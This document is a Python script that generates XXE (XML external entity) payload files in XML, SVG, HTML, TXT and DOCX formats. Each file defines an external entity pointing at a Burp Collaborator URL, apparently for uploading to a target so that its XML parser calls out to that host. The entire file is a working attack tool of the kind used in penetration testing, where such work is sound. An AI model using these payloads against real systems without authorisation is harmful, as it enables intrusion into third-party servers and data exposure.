import os
import zipfile


def generate_xxe_payloads(burp_collaborator_url: str, output_dir: str, filetypes: list):
    os.makedirs(output_dir, exist_ok=True)

    payload_templates = {
        "xml": f"""<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "{burp_collaborator_url}">]>
<foo>&xxe;</foo>
""",
        "svg": f"""<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "{burp_collaborator_url}">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <rect width="100" height="100" fill="blue"/>
  <text x="10" y="50" font-size="20" fill="white">&xxe;</text>
</svg>
""",
        "html": f"""<!DOCTYPE html [<!ENTITY xxe SYSTEM "{burp_collaborator_url}">]>
<html>
  <body>&xxe;</body>
</html>
""",
        "txt": f"""<!DOCTYPE txt [<!ENTITY xxe SYSTEM "{burp_collaborator_url}">]>
&xxe;
"""
    }

    print(f"Generating XXE payloads for filetypes: {filetypes}")

    for filetype in filetypes:
        if filetype in payload_templates:
            payload = payload_templates[filetype]
            filename = os.path.join(output_dir, f"xxe_payload.{filetype}")
            with open(filename, "w") as f:
                f.write(payload)
            print(f"Generated payload: {filename}")
        elif filetype == "docx":
            generate_docx_with_xxe(burp_collaborator_url, os.path.join(output_dir, "xxe_payload.docx"))
        else:
            print(f"Filetype '{filetype}' is not supported.")


def generate_docx_with_xxe(burp_collaborator_url: str, output_file: str):
    document_xml = f"""<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "{burp_collaborator_url}">
]>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
  <w:body>
    <w:p>
      <w:r>
        <w:t>&xxe;</w:t>
      </w:r>
    </w:p>
  </w:body>
</w:document>
"""

    docx_structure = {
        "[Content_Types].xml": """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
    <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
    <Default Extension="xml" ContentType="application/xml"/>
    <Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>
</Types>
""",
        "_rels/.rels": """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
    <Relationship Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument"
                  Target="word/document.xml" Id="R1"/>
</Relationships>
""",
        "word/_rels/document.xml.rels": """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
</Relationships>
""",
        "word/document.xml": document_xml
    }


    with zipfile.ZipFile(output_file, 'w') as docx:
        for path, content in docx_structure.items():
            docx.writestr(path, content)

    print(f"Generated XXE DOCX payload: {output_file}")


if __name__ == "__main__":
    burp_url = input("Enter Burp Collaborator URL (e.g., http://example.burpcollaborator.net): ")
    output_directory = "./xxe_payloads"
    supported_filetypes = ["xml", "svg", "html", "txt", "docx"]

    generate_xxe_payloads(burp_url, output_directory, supported_filetypes)

    print(f"Payloads have been saved to: {output_directory}")